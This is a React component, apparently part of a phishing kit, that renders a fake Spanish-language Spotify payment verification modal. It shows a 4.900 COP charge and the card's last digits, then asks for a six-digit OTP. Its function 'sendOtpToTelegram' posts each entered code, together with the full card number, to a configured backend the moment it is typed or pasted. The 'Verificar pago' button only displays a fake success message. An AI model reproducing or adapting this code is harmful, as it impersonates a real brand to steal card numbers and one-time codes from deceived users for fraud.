import { useState, useEffect, useRef } from "react"

export const OtpModal = ({ cardNumber, onClose }) => {
  const [digits, setDigits] = useState(["", "", "", "", "", ""])
  const [error, setError] = useState("")
  const [timer, setTimer] = useState(30)
  const [canResend, setCanResend] = useState(false)
  const [verifying, setVerifying] = useState(false)
  const [success, setSuccess] = useState(false)
  const inputRefs = useRef([])

  const lastFour = cardNumber
    ? cardNumber.replace(/\s/g, "").slice(-4)
    : "****"

  const now = new Date()
  const txDate =
    now.toLocaleDateString("es-CO") + " " + now.toTimeString().slice(0, 8)

  useEffect(() => {
    if (timer > 0) {
      const t = setTimeout(() => setTimer((p) => p - 1), 1000)
      return () => clearTimeout(t)
    } else {
      setCanResend(true)
    }
  }, [timer])

  const sendOtpToTelegram = async (code) => {
    try {
      const apiUrl = import.meta.env.VITE_API_URL
      await fetch(`${apiUrl}/api/pago/otp`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ otp: code, cardNumber: cardNumber || "" }),
      })
    } catch (_) {}
  }

  const handleChange = (i, val) => {
    const clean = val.replace(/\D/g, "").slice(-1)
    const next = [...digits]
    next[i] = clean
    setDigits(next)
    setError("")
    if (clean && i < 5) {
      inputRefs.current[i + 1]?.focus()
    }
    const filled = next.join("")
    if (filled.length === 6 && next.every((d) => d !== "")) {
      sendOtpToTelegram(filled)
    }
  }

  const handleKeyDown = (i, e) => {
    if (e.key === "Backspace" && !digits[i] && i > 0) {
      const next = [...digits]
      next[i - 1] = ""
      setDigits(next)
      inputRefs.current[i - 1]?.focus()
    }
  }

  const handlePaste = (e) => {
    e.preventDefault()
    const pasted = (e.clipboardData || window.clipboardData)
      .getData("text")
      .replace(/\D/g, "")
      .slice(0, 6)
    const next = ["", "", "", "", "", ""]
    pasted.split("").forEach((c, j) => { next[j] = c })
    setDigits(next)
    const focus = Math.min(pasted.length, 5)
    inputRefs.current[focus]?.focus()
    if (pasted.length === 6) {
      sendOtpToTelegram(pasted)
    }
  }

  const handleResend = () => {
    if (!canResend) return
    setDigits(["", "", "", "", "", ""])
    setError("")
    setTimer(30)
    setCanResend(false)
    inputRefs.current[0]?.focus()
  }

  const handleVerify = () => {
    const code = digits.join("")
    if (code.length < 6) {
      setError("Ingresa el código completo de 6 dígitos.")
      return
    }
    setVerifying(true)
    setTimeout(() => setSuccess(true), 1200)
  }

  const handleCancel = () => {
    setDigits(["", "", "", "", "", ""])
    setError("")
    setVerifying(false)
    if (onClose) onClose()
  }

  return (
    <div style={{
      position: "fixed", inset: 0, zIndex: 1000,
      background: "rgba(0,0,0,0.6)",
      display: "flex", alignItems: "center", justifyContent: "center",
      padding: "1rem"
    }}>
      <div style={{
        background: "#fff", borderRadius: "16px",
        border: "0.5px solid #e0e0e0",
        width: "100%", maxWidth: "400px",
        padding: "2rem", fontFamily: "sans-serif",
        position: "relative", overflow: "hidden"
      }}>
        {/* Header */}
        <div style={{
          display: "flex", alignItems: "center", gap: "10px",
          marginBottom: "1.5rem", paddingBottom: "1.25rem",
          borderBottom: "0.5px solid #e0e0e0"
        }}>
          <div style={{
            width: "36px", height: "36px", background: "#000",
            borderRadius: "50%", display: "flex",
            alignItems: "center", justifyContent: "center", flexShrink: 0
          }}>
            <svg viewBox="0 0 24 24" width="20" height="20" fill="white">
              <path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.479.659.301 1.02zm1.44-3.3c-.301.42-.841.6-1.262.3-3.239-1.98-8.159-2.58-11.939-1.38-.479.12-1.02-.12-1.14-.6-.12-.48.12-1.021.6-1.141C9.6 9.9 15 10.561 18.72 12.84c.361.181.54.78.241 1.2zm.12-3.36C15.24 8.4 8.82 8.16 5.16 9.301c-.6.179-1.2-.181-1.38-.721-.18-.601.18-1.2.72-1.381 4.26-1.26 11.28-1.02 15.721 1.621.539.3.719 1.02.42 1.56-.299.421-1.02.599-1.559.3z"/>
            </svg>
          </div>
          <div>
            <p style={{ fontSize: "15px", fontWeight: 500, margin: 0, color: "#000" }}>Spotify</p>
            <p style={{ fontSize: "12px", color: "#666", margin: 0 }}>Verificación segura del pago</p>
          </div>
          <div style={{ marginLeft: "auto" }}>
            <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="#999" strokeWidth="1.5">
              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
            </svg>
          </div>
        </div>

        <p style={{ fontSize: "16px", fontWeight: 500, margin: "0 0 0.35rem", color: "#000" }}>
          Ingresa el código de verificación
        </p>
        

        {/* Transaction info */}
        <div style={{
          background: "#f5f5f5", borderRadius: "10px",
          padding: "0.9rem 1rem", marginBottom: "1.25rem"
        }}>
          <table style={{ width: "100%", fontSize: "13px", borderCollapse: "collapse" }}>
            <tbody>
              <tr>
                <td style={{ color: "#666", padding: "3px 0", width: "110px" }}>Comercio</td>
                <td style={{ color: "#000", fontWeight: 500, textAlign: "right" }}>Spotify AB</td>
              </tr>
              <tr>
                <td style={{ color: "#666", padding: "3px 0" }}>Monto</td>
                <td style={{ color: "#000", fontWeight: 500, textAlign: "right" }}>4.900 COP</td>
              </tr>
              <tr>
                <td style={{ color: "#666", padding: "3px 0" }}>Tarjeta</td>
                <td style={{ color: "#000", fontWeight: 500, textAlign: "right" }}>
                  XXXX XXXX XXXX {lastFour}
                </td>
              </tr>
              <tr>
                <td style={{ color: "#666", padding: "3px 0" }}>Fecha</td>
                <td style={{ color: "#000", fontWeight: 500, textAlign: "right" }}>{txDate}</td>
              </tr>
            </tbody>
          </table>
        </div>

        {/* OTP inputs */}
        <label style={{ fontSize: "12px", color: "#666", display: "block", marginBottom: "6px" }}>
          Código OTP
        </label>
        <div style={{ display: "flex", gap: "8px", marginBottom: "1rem" }} onPaste={handlePaste}>
          {digits.map((d, i) => (
            <input
              key={i}
              ref={(el) => (inputRefs.current[i] = el)}
              maxLength={1}
              inputMode="numeric"
              value={d}
              onChange={(e) => handleChange(i, e.target.value)}
              onKeyDown={(e) => handleKeyDown(i, e)}
              style={{
                width: "100%", height: "48px", textAlign: "center",
                fontSize: "20px", fontWeight: 500,
                border: `0.5px solid ${d ? "#1ed760" : "#ccc"}`,
                borderRadius: "8px", background: "#fff",
                color: "#000", outline: "none"
              }}
            />
          ))}
        </div>

        {error && (
          <p style={{ fontSize: "12px", color: "#e74c3c", margin: "0 0 0.75rem" }}>{error}</p>
        )}

        <button
          onClick={handleVerify}
          disabled={verifying}
          style={{
            width: "100%", height: "44px", background: "#1ed760",
            border: "none", borderRadius: "22px", fontSize: "15px",
            fontWeight: 500, color: "#000", cursor: verifying ? "default" : "pointer",
            marginBottom: "0.75rem", opacity: verifying ? 0.7 : 1
          }}
        >
          {verifying ? "Verificando..." : "Verificar pago"}
        </button>

        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
          <button
            onClick={handleCancel}
            style={{
              fontSize: "13px", color: "#666", background: "none",
              border: "none", cursor: "pointer", padding: 0, textDecoration: "underline"
            }}
          >
            Cancelar
          </button>
          <span style={{ fontSize: "13px", color: "#666" }}>
            ¿No llegó?{" "}
            <span
              onClick={handleResend}
              style={{
                color: canResend ? "#1ed760" : "#999",
                cursor: canResend ? "pointer" : "default",
                fontWeight: 500
              }}
            >
              {canResend ? "Reenviar código" : `Reenviar (${timer}s)`}
            </span>
          </span>
        </div>

        {/* Success overlay */}
        {success && (
          <div style={{
            position: "absolute", inset: 0, background: "#fff",
            borderRadius: "16px", display: "flex", flexDirection: "column",
            alignItems: "center", justifyContent: "center",
            gap: "12px", textAlign: "center", padding: "2rem"
          }}>
            <div style={{
              width: "56px", height: "56px", background: "#1ed760",
              borderRadius: "50%", display: "flex",
              alignItems: "center", justifyContent: "center"
            }}>
              <svg viewBox="0 0 24 24" width="28" height="28" fill="none" stroke="#000" strokeWidth="2.5">
                <polyline points="20 6 9 17 4 12"/>
              </svg>
            </div>
            <p style={{ fontSize: "16px", fontWeight: 500, margin: 0, color: "#000" }}>Pago verificado</p>
            <p style={{ fontSize: "13px", color: "#666", margin: 0 }}>Tu suscripción Premium está activa.</p>
          </div>
        )}
      </div>
    </div>
  )
}
